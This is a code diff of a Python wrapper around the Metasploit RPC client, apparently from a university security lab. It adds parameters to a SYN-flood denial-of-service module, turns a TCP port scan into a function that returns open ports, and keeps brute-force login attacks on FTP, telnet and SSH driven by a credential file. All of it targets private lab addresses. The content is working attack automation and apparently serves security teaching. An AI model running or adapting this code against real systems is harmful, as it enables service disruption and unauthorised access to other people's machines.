@@ -13,21 +13,31 @@ class Metasploit:
 
     # Start a denial-of-service (dos) attack
     # It sends a bunch of tcp handshakes to the target
-    def dos_attack(self, ip: str):
+    def dos_attack(self, ip: str, port: int):
         exploit = self.client.modules.use('auxiliary', 'dos/tcp/synflood')
         exploit['RHOSTS'] = ip
+        exploit['RPORT'] = port
+        exploit['INTERFACE'] = 'wlan0'
+        exploit['NUM'] = 500
         print(exploit.description)
-        #exploit.execute()
-        #print(self.client.sessions.list)
         print(self.client.consoles.console(self.cid).run_module_with_output(exploit))
 
     def tcp_portscan_attack(self, ip: str):
         exploit = self.client.modules.use('auxiliary', 'scanner/portscan/tcp')
         exploit['RHOSTS'] = ip
-        #print(exploit.description)
-        #print(exploit.execute())
+        exploit['PORTS'] = '22-25,80,443,6668,8080'
 
-        print(self.client.consoles.console(self.cid).run_module_with_output(exploit))
+        output = self.client.consoles.console(self.cid).run_module_with_output(exploit)
+        print(output)
+        # Check if TCP port is open
+        ports = []
+        lines = output.split('\n')
+        for line in lines:
+            if line.startswith('[+]'):
+                ports.append(int(line.split(':')[2].split(' ')[0]))
+        return ports
+
+
 
     # Brute-force login attack on ftp, telnet and ssh
     def brute_force_login(self, ip: str, service: str):
@@ -38,33 +48,14 @@ class Metasploit:
         elif(service == 'ssh'):
             exploit = self.client.modules.use('auxiliary', 'scanner/ssh/ssh_login')
         exploit['RHOSTS'] = ip
-        #exploit['PASS_FILE'] = '/home/kali/git/it-sicherheit-prakitkum/telnet_default_pass.txt'
         exploit['USERPASS_FILE'] = '/home/kali/git/it-sicherheit-prakitkum/user_pass.txt'
-
         print(self.client.consoles.console(self.cid).run_module_with_output(exploit))
-        # print(exploit.description)
-        # exploit.execute()
-
-
-    # Use dir(client) to see the callable methods.
-    #print(dir(self.client))
-
-    # Explore exploit modules
-    #for i in client.modules.exploits:
-    #    print(i)
-
-    # Create an exploit module object
-    # exploit = client.modules.use('exploit', 'unix/ftp/vsftpd_234_backdoor')
-    #exploit = client.modules.use('auxiliary', 'auxiliary/scanner/portscan/tcp')
-
-    # Explore exploit information:
-    #print(exploit.description)
 
 if __name__ == "__main__":
-    #metaspl = Metasploit()
-    send_packet("brute", "192.168.12.251", "start")
-    #metaspl.tcp_portscan_attack('192.168.12.251')
+    metaspl = Metasploit()
+    #send_packet("brute", "192.168.12.251", "start")
+    metaspl.tcp_portscan_attack('192.168.12.113')
     #metaspl.brute_force_login('192.168.12.251', 'telnet')
-    #metaspl.dos_attack('192.168.12.251')
-    send_packet("dos", "192.168.12.251", "stop")
+    #metaspl.dos_attack('192.168.12.113')
+    #send_packet("dos", "192.168.12.251", "stop")
     #metaspl.brute_force_login('127.0.0.1', 'ssh')
